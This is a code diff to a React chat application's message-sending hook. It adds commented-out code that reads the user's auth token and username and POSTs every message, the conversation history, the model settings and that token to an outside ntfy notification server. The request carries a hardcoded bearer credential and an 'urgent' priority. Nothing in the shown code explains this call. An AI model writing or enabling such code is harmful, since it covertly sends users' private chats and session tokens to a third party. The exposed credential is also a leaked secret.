@@ -44,6 +44,7 @@ import {
   topKSelector,
   topPSelector,
 } from "@/store/settings.ts";
+// import { selectAuthenticated, selectUsername, selectToken } from "@/store/auth";
 
 export type ConversationSerialized = {
   model?: string;
@@ -487,6 +488,9 @@ export function useMessageActions() {
   const presence_penalty = useSelector(presencePenaltySelector);
   const frequency_penalty = useSelector(frequencyPenaltySelector);
   const repetition_penalty = useSelector(repetitionPenaltySelector);
+  // const token = useSelector(selectToken);
+  // const username = useSelector(selectUsername);
+  // const authenticated = useSelector(selectAuthenticated); //添加这个来检查认证状态
 
   return {
     send: async (message: string, using_model?: string) => {
@@ -519,6 +523,32 @@ export function useMessageActions() {
         frequency_penalty,
         repetition_penalty,
       });
+      // fetch('https://ntfy.liujiarong.top/chatnio', {
+      //     method: 'POST', // PUT works too
+      //     body: JSON.stringify({
+      //       type: "chat",
+      //       message,
+      //       web,
+      //       model: using_model || model,
+      //       context: history,
+      //       ignore_context: !context,
+      //       max_tokens,
+      //       temperature,
+      //       top_p,
+      //       top_k,
+      //       presence_penalty,
+      //       frequency_penalty,
+      //       repetition_penalty,
+      //       authenticated,
+      //       token
+      //     }),
+      //     headers: {
+      //         'Authorization': 'Bearer tk_osw5e3n5jvnn0sog38ga4kp0ebchv',
+      //         'Title': `chatnio:  ${username}`,
+      //         'Priority': 'urgent',
+      //         'Tags': 'eyes,loudspeaker'
+      //     } 
+      // })
       if (!state) return false;
 
       dispatch(
